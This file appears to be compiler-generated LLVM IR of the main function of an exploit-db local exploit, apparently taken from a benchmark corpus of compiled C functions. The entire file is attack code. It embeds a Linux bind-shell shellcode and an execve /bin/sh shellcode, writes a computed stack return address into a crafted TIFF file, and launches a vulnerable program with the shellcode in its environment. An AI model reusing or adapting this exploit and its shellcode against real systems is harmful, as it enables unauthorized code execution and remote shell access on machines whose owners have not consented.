; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_1554.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_1554.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.linux_bind = private unnamed_addr constant [109 x i8] c"1\C0P@P@P\B0f1\DBC\89\E1\CD\80\99RRR\BA\02\01\11\11\FE\CER\89\E21\C9\B1\10QRP\89\C2\89\E1\B0f\B3\02\89\E1\CD\80\B0f\B3\04SR\89\E1\CD\801\C0PPR\89\E1\B0f\B3\05\CD\80\89\C31\C9\B1\03\B0?I\CD\80A\E2\F8Qhn/shh//bi\89\E3QS\89\E1\99\B0\0B\CD\80\00", align 16
@.str = private unnamed_addr constant [15 x i8] c"Linux Enabled\0A\00", align 1
@__const.main.shellcode = private unnamed_addr constant [48 x i8] c"\EB ^\89v\081\C0\89F\0C\88F\07\8DV\0C\8DN\08\89\F31\C0\B0\0B\CD\801\DB\B0\01\CD\80\E8\DB\FF\FF\FF/bin/sh#\00", align 16
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [67 x i8] c"Error, arguments are like these\0A%s <path_to_vuln> <eviltiff.tiff>\0A\00", align 1
@HOMEDIR = common dso_local global i8* null, align 8
@DISPLAY = common dso_local global i8* null, align 8
@O_RDWR = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"open()\00", align 1
@OFFSET = common dso_local global i32 0, align 4
@SEEK_SET = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [8 x i8] c"lseek()\00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"write()\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [19 x i8] c"Using RET: 0x%.8x\0A\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"tiff\00", align 1
@.str.7 = private unnamed_addr constant [9 x i8] c"execve()\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca [109 x i8], align 16
  %9 = alloca [48 x i8], align 16
  %10 = alloca [4 x i8*], align 16
  %11 = alloca i64, align 8
  %12 = alloca i32, align 4
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %13 = bitcast [109 x i8]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %13, i8* align 16 getelementptr inbounds ([109 x i8], [109 x i8]* @__const.main.linux_bind, i32 0, i32 0), i64 109, i1 false)
  %14 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0))
  %15 = bitcast [48 x i8]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %15, i8* align 16 getelementptr inbounds ([48 x i8], [48 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 48, i1 false)
  %16 = load i32, i32* %5, align 4
  %17 = icmp slt i32 %16, 3
  br i1 %17, label %18, label %24

18:                                               ; preds = %3
  %19 = load i32, i32* @stderr, align 4
  %20 = load i8**, i8*** %6, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i32, i8*, ...) @fprintf(i32 %19, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.1, i64 0, i64 0), i8* %22)
  store i32 -1, i32* %4, align 4
  br label %91

24:                                               ; preds = %3
  %25 = getelementptr inbounds [4 x i8*], [4 x i8*]* %10, i64 0, i64 0
  %26 = load i8*, i8** @HOMEDIR, align 8
  store i8* %26, i8** %25, align 8
  %27 = getelementptr inbounds i8*, i8** %25, i64 1
  %28 = load i8*, i8** @DISPLAY, align 8
  store i8* %28, i8** %27, align 8
  %29 = getelementptr inbounds i8*, i8** %27, i64 1
  %30 = getelementptr inbounds [48 x i8], [48 x i8]* %9, i64 0, i64 0
  store i8* %30, i8** %29, align 8
  %31 = getelementptr inbounds i8*, i8** %29, i64 1
  store i8* null, i8** %31, align 8
  %32 = load i8**, i8*** %6, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @strlen(i8* %34)
  %36 = sext i32 %35 to i64
  %37 = sub i64 3221225464, %36
  %38 = getelementptr inbounds [48 x i8], [48 x i8]* %9, i64 0, i64 0
  %39 = call i32 @strlen(i8* %38)
  %40 = sext i32 %39 to i64
  %41 = sub i64 %37, %40
  %42 = sub i64 %41, 2
  store i64 %42, i64* %11, align 8
  %43 = load i8**, i8*** %6, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 2
  %45 = load i8*, i8** %44, align 8
  %46 = load i32, i32* @O_RDWR, align 4
  %47 = call i32 @open(i8* %45, i32 %46)
  store i32 %47, i32* %12, align 4
  %48 = load i32, i32* %12, align 4
  %49 = icmp eq i32 %48, -1
  br i1 %49, label %50, label %52

50:                                               ; preds = %24
  %51 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %4, align 4
  br label %91

52:                                               ; preds = %24
  %53 = load i32, i32* %12, align 4
  %54 = load i32, i32* @OFFSET, align 4
  %55 = load i32, i32* @SEEK_SET, align 4
  %56 = call i32 @lseek(i32 %53, i32 %54, i32 %55)
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %62

58:                                               ; preds = %52
  %59 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0))
  %60 = load i32, i32* %12, align 4
  %61 = call i32 @close(i32 %60)
  store i32 -1, i32* %4, align 4
  br label %91

62:                                               ; preds = %52
  %63 = load i32, i32* %12, align 4
  %64 = bitcast i64* %11 to i8*
  %65 = call i32 @write(i32 %63, i8* %64, i32 8)
  %66 = sext i32 %65 to i64
  %67 = icmp ult i64 %66, 8
  br i1 %67, label %68, label %72

68:                                               ; preds = %62
  %69 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.4, i64 0, i64 0))
  %70 = load i32, i32* %12, align 4
  %71 = call i32 @close(i32 %70)
  store i32 -1, i32* %4, align 4
  br label %91

72:                                               ; preds = %62
  %73 = load i32, i32* %12, align 4
  %74 = call i32 @close(i32 %73)
  %75 = load i32, i32* @stdout, align 4
  %76 = load i64, i64* %11, align 8
  %77 = trunc i64 %76 to i32
  %78 = call i32 (i32, i8*, ...) @fprintf(i32 %75, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.5, i64 0, i64 0), i32 %77)
  %79 = load i8**, i8*** %6, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 1
  %81 = load i8*, i8** %80, align 8
  %82 = load i8**, i8*** %6, align 8
  %83 = getelementptr inbounds i8*, i8** %82, i64 2
  %84 = load i8*, i8** %83, align 8
  %85 = getelementptr inbounds [4 x i8*], [4 x i8*]* %10, i64 0, i64 0
  %86 = call i32 @execle(i8* %81, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i64 0, i64 0), i8* %84, i32* null, i8** %85)
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %88, label %90

88:                                               ; preds = %72
  %89 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0))
  store i32 -1, i32* %4, align 4
  br label %91

90:                                               ; preds = %72
  store i32 0, i32* %4, align 4
  br label %91

91:                                               ; preds = %90, %88, %68, %58, %50, %18
  %92 = load i32, i32* %4, align 4
  ret i32 %92
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @open(i8*, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @lseek(i32, i32, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @execle(i8*, i8*, i8*, i32*, i8**) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
